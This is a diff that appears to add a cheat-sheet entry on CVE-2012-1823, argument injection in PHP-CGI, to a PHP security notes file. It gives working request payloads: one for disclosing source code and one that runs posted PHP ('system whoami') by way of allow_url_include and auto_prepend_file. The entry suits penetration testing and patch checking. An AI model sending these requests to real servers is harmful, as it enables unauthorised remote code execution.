@@ -57,3 +57,22 @@ stat
 touch
 unlink
 ```
+
+
+## CVE-2012-1823: RCE in PHP-CGI
+
+PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.
+
+You can show the page source code:
+```
+GET https://<host>/file.php?-s
+```
+
+Or even execute PHP scripts (or a remote code execution)
+```
+POST https://<host>/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+
+<?php system('whoami'); ?>
+```
+
+More details can be found on the Metasploit script [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb)
